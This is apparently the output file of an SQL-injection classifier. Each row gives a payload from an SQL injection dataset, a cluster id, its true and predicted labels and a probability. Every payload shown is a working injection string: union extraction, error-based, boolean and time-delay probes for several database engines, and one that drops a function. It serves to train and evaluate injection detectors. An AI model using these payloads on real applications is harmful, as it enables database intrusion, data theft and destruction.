text,source,fuzzy_cluster_id,true_label,pred_label,prob_sqli,correct
-5258  )   or   (  8459  =  8459  )  *4906,sajid576/sql-injection-dataset,2791,1,1,0.9999932050704956,1
"1"" waitfor delay '0:0:5'",sajid576/sql-injection-dataset,114,1,1,0.9999895095825195,1
1  )   as ywrn where 1893  =  1893,sajid576/sql-injection-dataset,2804,1,1,0.999992847442627,1
"-3151%""   )    )     )   union all select 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",sajid576/sql-injection-dataset,2809,1,1,0.999993085861206,1
"1""   )    )    as pqbs where 4409  =  4409",sajid576/sql-injection-dataset,2816,1,1,0.9999932050704956,1
"1   )    )    as vzso where 8541  =  8541 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"1   )    )    as xovu where 4530  =  4530 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sajid576/sql-injection-dataset,2830,1,1,0.9999932050704956,1
"1""   )    )    and 8329  =  5584#",sajid576/sql-injection-dataset,2836,1,1,0.999993085861206,1
"1""   )    )    and sleep  (  5  )   and    (    (   ""lied"" like ""lied",sajid576/sql-injection-dataset,2840,1,1,0.9999932050704956,1
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"1%""   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
-4637' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ),sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
1  )   and 2006  =  2006,sajid576/sql-injection-dataset,499,1,1,0.9999929666519165,1
"-8735'   )    )    union all select 3262,3262,3262--",sajid576/sql-injection-dataset,2857,1,1,0.9999933242797852,1
"-9405'  )   union all select 8283,8283,8283,8283--",sajid576/sql-injection-dataset,2867,1,1,0.9999932050704956,1
"-8038'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xfyq'  =  'xfyq",sajid576/sql-injection-dataset,2870,1,1,0.9999932050704956,1
"1"" and 2006  =  2006",sajid576/sql-injection-dataset,499,1,1,0.9999929666519165,1
-8069'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'qbvz'  =  'qbvz,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"-5322"" union all select 6494,6494,6494,6494,6494,6494--",sajid576/sql-injection-dataset,2882,1,1,0.9999926090240479,1
"1 where 8273  =  8273 union all select null,null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,2894,1,1,0.9999926090240479,1
1' where 8635  =  8635 order by 1--,sajid576/sql-injection-dataset,2904,1,1,0.999993085861206,1
-8447 where 2850  =  2850 or 7147  =  3262,sajid576/sql-injection-dataset,2905,1,1,0.999992847442627,1
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'bzgs' like 'bzgs",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""llgb"" like ""llgb",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"1' and elt  (  2266  =  7467,7467  )",sajid576/sql-injection-dataset,2922,1,1,0.9999929666519165,1
-9389'  )   or 8859  =  3989--,sajid576/sql-injection-dataset,2934,1,1,0.999993085861206,1
"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",sajid576/sql-injection-dataset,2943,1,1,0.9999932050704956,1
waitfor delay '0:0:5' and    (    (     (  'ozjl' like 'ozjl,sajid576/sql-injection-dataset,2952,1,1,0.999992847442627,1
"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'yzdp'  =  'yzdp",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137,sajid576/sql-injection-dataset,2959,1,1,0.9999932050704956,1
1%'   )    )    and 2006  =  2006,sajid576/sql-injection-dataset,499,1,1,0.999993085861206,1
"1""  )   as sraw where 1997  =  1997 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"1'  )   as pkis where 3446  =  3446 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",sajid576/sql-injection-dataset,2968,1,1,0.9999933242797852,1
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"1' where 4150  =  4150 and elt  (  8012  =  6026,6026  )  --",sajid576/sql-injection-dataset,2983,1,1,0.9999932050704956,1
1  )   where 9078  =  9078 rlike sleep  (  5  )  #,sajid576/sql-injection-dataset,2999,1,1,0.9999932050704956,1
"-8940""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""vnuo"" like ""vnuo",sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#",sajid576/sql-injection-dataset,3008,1,1,0.9999923706054688,1
"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,sajid576/sql-injection-dataset,229,1,1,0.9999929666519165,1
1   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  4694  =  4694,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"1  )   as azdb where 4219  =  4219 union all select null,null,null,null#",sajid576/sql-injection-dataset,3020,1,1,0.999992847442627,1
1'  )   where 8707  =  8707 and 3210  =  1477--,sajid576/sql-injection-dataset,3025,1,1,0.9999932050704956,1
-1344  )   as gqgi where 2545  =  2545 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sajid576/sql-injection-dataset,283,1,1,0.9999933242797852,1
1'+  (  select qsmo where 3172  =  3172,sajid576/sql-injection-dataset,3034,1,1,0.999993085861206,1
"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'lxqz'  =  'lxqz",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
1%'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  '%'  =  ',sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
if  (  2823  =  3532  )   select 2823 else drop function kmqw--,sajid576/sql-injection-dataset,3043,1,1,0.9999932050704956,1
1   )    )     )   and 2006  =  2006,sajid576/sql-injection-dataset,499,1,1,0.999993085861206,1
-7452' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'nmdq' like 'nmdq,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"-1139  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
-9501'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'mndw'  =  'mndw,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"1""   )    )    as ylah where 9248  =  9248",sajid576/sql-injection-dataset,3057,1,1,0.9999932050704956,1
(  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4501  =  4501  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ),sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
1  )   where 3979  =  3979 rlike sleep  (  5  )  --,sajid576/sql-injection-dataset,3067,1,1,0.9999932050704956,1
"1  )   as drbw where 2380  =  2380 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",sajid576/sql-injection-dataset,3076,1,1,0.9999933242797852,1
-3136%'  )   or 3400  =  6002,sajid576/sql-injection-dataset,3089,1,1,0.999993085861206,1
"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",sajid576/sql-injection-dataset,3100,1,1,0.9999924898147583,1
"1""  )   as ffon where 2738  =  2738 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",sajid576/sql-injection-dataset,3111,1,1,0.9999933242797852,1
1'  )   as akvn where 8669  =  8669,sajid576/sql-injection-dataset,3124,1,1,0.999993085861206,1
-6665'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'winx'  =  'winx,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'foju'  =  'foju,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"end and    (    (   ""kvts"" like ""kvts",sajid576/sql-injection-dataset,3132,1,1,0.999992847442627,1
"-6581'||  (  select 'hpjd' where 7608  =  7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#",sajid576/sql-injection-dataset,3136,1,1,0.9999932050704956,1
"-4830""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dyut""  =  ""dyut",sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"-3205""  )   union all select 5233,5233,5233,5233#",sajid576/sql-injection-dataset,3147,1,1,0.9999932050704956,1
1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'zjun'  =  'zjun,sajid576/sql-injection-dataset,229,1,1,0.9999932050704956,1
1  )   and 3861  =  5813--,sajid576/sql-injection-dataset,3159,1,1,0.999993085861206,1
1' where 8537  =  8537 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"-6642'  )   where 3459  =  3459 union all select 3459,3459,3459,3459,3459,3459,3459,3459,3459#",sajid576/sql-injection-dataset,3171,1,1,0.9999932050704956,1
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"-4707' union all select 4414,4414,4414,4414,4414,4414#",sajid576/sql-injection-dataset,3181,1,1,0.9999927282333374,1
"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
select   (  case when   (  4994  =  1572  )   then 4994 else 4994*  (  select 4994 from mysql.db  )   end  )  #,sajid576/sql-injection-dataset,3191,1,1,0.999993085861206,1
"1   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   3038  =  3038",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"1'||  (  select 'ttyt' where 3751  =  3751 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sajid576/sql-injection-dataset,3201,1,1,0.9999933242797852,1
1' in boolean mode  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  #,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"1'||  (  select 'xbwg' where 7518  =  7518 union all select null,null,null,null,null,null--",sajid576/sql-injection-dataset,3206,1,1,0.999993085861206,1
1'   )    )    as eltx where 9955  =  9955 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,sajid576/sql-injection-dataset,263,1,1,0.9999933242797852,1
"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,1537,1,1,0.9999929666519165,1
"select * from generate_series  (  7762,7762,case when   (  7762  =  1293  )   then 1 else 0 end  )   limit 1--",sajid576/sql-injection-dataset,3224,1,1,0.999993085861206,1
"-1722' union all select 1408,1408,1408#",sajid576/sql-injection-dataset,3226,1,1,0.999992847442627,1
-1940 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ),sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""qowc"" like ""qowc",sajid576/sql-injection-dataset,3238,1,1,0.9999932050704956,1
-4582   )    )    as gvfo where 8885  =  8885 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sajid576/sql-injection-dataset,283,1,1,0.9999933242797852,1
select   (  case when   (  7594  =  8086  )   then 7594 else 1/  (  select 0  )   end  )  --,sajid576/sql-injection-dataset,3243,1,1,0.999993085861206,1
"-7543'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
"1 where 6044  =  6044 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
-9742  )   where 8409  =  8409 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"1%""   )    )    and sleep  (  5  )   and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,1537,1,1,0.9999929666519165,1
"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'xpks' like 'xpks",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"-2782'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999932050704956,1
1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'toxr' like 'toxr,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"1%""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"1"" where 5062  =  5062",sajid576/sql-injection-dataset,3261,1,1,0.999993085861206,1
1 waitfor delay '0:0:5',sajid576/sql-injection-dataset,114,1,1,0.9999570846557617,1
"1""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""jmjr"" like ""jmjr",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'omlt'  =  'omlt,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
end and '%'  =  ',sajid576/sql-injection-dataset,3274,1,1,0.9999924898147583,1
1' waitfor delay '0:0:5',sajid576/sql-injection-dataset,114,1,1,0.9999914169311523,1
"1'  )   as jiic where 6158  =  6158 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"-1434'   )    )    union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#",sajid576/sql-injection-dataset,3279,1,1,0.999993085861206,1
"-3321"" where 1603  =  1603 union all select 1603,1603,1603,1603#",sajid576/sql-injection-dataset,3286,1,1,0.999993085861206,1
"1""   )    )    as tkmd where 3415  =  3415 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",sajid576/sql-injection-dataset,3295,1,1,0.9999933242797852,1
"1  )   as rsyw where 4857  =  4857 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"1  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  8450  =  8450",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"1'  )   where 6988  =  6988 union all select null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,3310,1,1,0.999993085861206,1
"1""  )   as dezr where 2145  =  2145 or sleep  (  5  )  #",sajid576/sql-injection-dataset,3315,1,1,0.9999932050704956,1
1'  )   and 2006  =  2006,sajid576/sql-injection-dataset,499,1,1,0.9999929666519165,1
"1%"" waitfor delay '0:0:5'--",sajid576/sql-injection-dataset,114,1,1,0.999990701675415,1
waitfor delay '0:0:5'  )  +',sajid576/sql-injection-dataset,114,1,1,0.9999923706054688,1
1  )   where 8813  =  8813,sajid576/sql-injection-dataset,3330,1,1,0.9999929666519165,1
1'  )   where 6222  =  6222 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,sajid576/sql-injection-dataset,3344,1,1,0.9999932050704956,1
"-1235""   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""ahhz"" like ""ahhz",sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
select   (  case when   (  9376  =  4521  )   then 1 else 9376*  (  select 9376 from master..sysdatabases  )   end  )  --,sajid576/sql-injection-dataset,3349,1,1,0.9999932050704956,1
